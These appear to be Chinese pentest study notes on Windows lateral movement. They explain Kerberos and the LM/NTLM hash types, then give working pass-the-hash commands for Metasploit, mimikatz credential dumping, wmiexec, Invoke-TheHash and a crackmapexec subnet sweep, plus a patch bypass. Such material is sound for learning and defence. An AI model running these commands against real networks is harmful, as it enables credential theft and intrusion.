# windows横向移动学习

## 基础知识

### 本地认证流程

·![](https://raw.githubusercontent.com/Explorersss/photo/master/20201007185004.png)



### kerberos

![](https://raw.githubusercontent.com/Explorersss/photo/master/20201007165908.png)

#### 名词解释

```
KDC (Key Distribution Center):密钥分发中心，包含AS和TGS服务
AS (Authentication Server):身份认证服务
TGS(Ticket Granting Server):票据授权服务
TGT(Ticket Granting Ticket)：由身份认证授予的票据，用于身份认证，存储在内存中，默认有效期为10小时
```



#### 认证过程

```
第一:从AS服务器中获取TGT票据
用户在客户端输入账号和密码之后，会对密码进行hash处理，作为user-secret-key
1. 客户端将用户名发送给AS服务器申请服务,在AS服务器中会对用户名进行验证，在AS服务器本地数据库中查询到该用户名的密码，并使用hash生成user-secrect-key.
2. AS服务器向用户发送两样东西：
   1） Client/TGS会话密钥，使用user-secrect-key进行加密
   2） TGT，包含TGS会话密钥，用户信息，时间戳，TGT有效期。使用TGS密钥进行加密
3. 用户接收到消息之后，回使用本地的user-secret-key对消息1)进行解密，如果解密成功，说明用户提供的凭证是正确的,此时用户得到了加密后的TGT。
第二:从TGS服务器中获取访问权限
1. 客户端向TGS服务器发送信息：
   1） 第一步骤中的TGT
   2） 认证信息（认证符(Authenticator)），包含用户id以及时间戳，通过TGS会话密钥进行加密。
2. TGS服务器收到消息之后，会使用TGS密钥对消息1）进行解密,获取到TGS会话密钥，进而对消息2）进行解密，在对用户id以及时间戳进行认证，如果认证成功，向客户端发送消息：
   1） client-server-ticket(包含SS会话密钥，用户名信息以及时间戳)，使用ss密钥进行加密
   2） ss会话密钥使用TGS会话密钥进行加密
3. 客户端收到信息之后会对消息2）进行解密，获得ss会话密钥。
第三：访问服务
1. 客户端向ss服务器发送以下消息：
   1）第二步骤中的client-server-ticket
   2）新的Authenticator，包含用户信息，时间戳。通过SS会话密钥进行加密
2. SS服务器收到消息之后，会使用ss密钥对消息1）进行解密，解密之后使用ss会话密钥对消息2）解密，解密成功之后会得到authenticator，认证之后，发送：
   1）新时间戳，Client发送的时间戳加1，通过ss会话密钥进行加密
3. 客户端收到时间戳之后，解密确认，成功之后发送服务请求
4. ss服务器收到之后提供服务。
```







### 三种hash

#### LM HASH

LAN Manager（LM）哈希是Windows系统所用的第一种密码哈希算法,，用于老版本Windows系统登录认证。在LAN Manager协议中使用，非常容易通过暴力破解获取明文凭据。但是在Windows Vista和Windows 7系统之后，这种哈希算法是默认关闭。

 LM HASH生成规则如下：

- 用户的密码被限制为最多14个字符。
- 用户的密码转换为大写。
- 密码转换为16进制字符串，不足14字节将会用0来再后面补全。
- 密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度，再分7bit为一组末尾加0，组成新的编码（str_to_key()函数处理）
- 上步骤得到的8byte二组，分别作为DES key为"KGS!@#$%"进行加密。
- 将二组DES加密后的编码拼接，得到最终LM HASH值。

#### NTML



NTML 是用于 Windows NT 和 Windows 2000 Server 工作组环境的身份验证协议,主要用于Windows Vista及其之后的系统。它还用在必须对 Windows NT 系统进行身份验证的混合 Windows 2000 Active Directory 域环境中。这类Hash可以直接用于PtH，并且通常存在于lsass进程中，便于SSP使用。**获取后可直接用于Hash传递攻击**

Windows系统下hash密码格式 用户名称:RID:LM-HASH值:NT-HASH值，

可以用LM-HASH值:NT-HASH值去在线查询http://www.objectif-securite.ch/en/ophcrack.php或者使用GetHashes、Ophcrack破解系统Hash密码生成过程

![](https://raw.githubusercontent.com/Explorersss/photo/master/20201007184802.png)



#### NET-NTML HASH

NET-NTLM HASH是指网络环境下NTLM认证中的hash，有两种一种是Net-NTLMv1另一种是Net-NTLMv2。

Net-NTLMv1 相对脆弱，自Windows Vista/Server2008开始，系统默认禁用Net-NTLMv1，使用Net-NTLMv2。

虽然不能直接用与hash传递攻击，但是可以**通过smb中继来利用**



## PTH(PASS THE HASH，哈希传递攻击)



适用于

```
域/工作组环境
可以获得hash,但是条件不允许对hash爆破
内网中存在和当前机器相同的密码
```



### metepreter

```
use exploit/windows/smb/psexec_psh
set smbdomain xx.int
Set SMBuser admin
set SMBPass 01FC5A6BE7BC6929AAD3BXXX:0CB6948805F7XXXXX807973B89537
```





### pth-exec



```
pth-winexec -U pentestlab/administrator%eb9e3066e4d25b5025ad3b83fa6627c7:03bebb338e70244589ea67c7439c77ba //1.1.1.21 cmd.exe
```



### mimikatz

先抓密码取得NTMLhash，mimikatz实现了在禁用NTLM的环境下仍然可以远程连接。

```
privilege::debug
sekurlsa::logonpasswords

mimikatz # sekurlsa::pth /user:Administrator /domain:FENTESTLAB.com /ntlm:11ec7935618f326490509a0703fbadb8
```



#### aes key 远程连接

前提：安装kb2871997

获取aes key

```
privilege::debug
sekurlsa::ekeys
```



pth

```
privilege::debug 
sekurlsa::pth /user:Administrator /domain:FENTESTLAB.com /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c

dir \\WIN-8VVLRPIAJB0\c$
```



### wmiexec

wmi是从windows从03/xp开始win内置的插件，是为了管理员能更加方便的对远程windows主机进行各种日常管理。

win版：https://github.com/maaaaz/impacket-examples-windows

python版：https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py

```
wmiexec -hashes 00000000000000000000000000000000:7ECFFFF0C3548187607A14BAD0F88BB1 域名/用户名@192.168.1.1 "whoami"
```



### Invoke-TheHash

https://github.com/Kevin-Robertson/Invoke-TheHash

```
Invoke-WMIExec -Target 1.1.1.22 -Domain pentestlab -Username administrator -Hash 7ECFFFF0C3548187607A14BAD0F88BB1 -Command "command or launcher to execute" -verbose

```



### crackmapexec

这个工具可以对C段进行批量尝试pth，可以先ew代理到kali

https://github.com/byt3bl33d3r/CrackMapExec.git

```
crackmapexec 1.1.1.0/24 -u administrator -H 11ec7935618f326490509a0703fbzdb8
```

### bypass

#### KB2871997

微软再2014年5月13日发布了针对Hash传递的补丁KB2871997，更新用于禁止本地管理员用于远程连接，这样本地管理员无法以本地管理员权限在远程主机上之洗礼wmi,psexec等。然而在实际的测试中发现常规的Hash传递虽已无法成功，但默认administrator(sid500) 账号除外，即使改名，这个账号仍然可以进行Hash传递攻击。



## 链接

https://lengjibo.github.io/LateralMovement/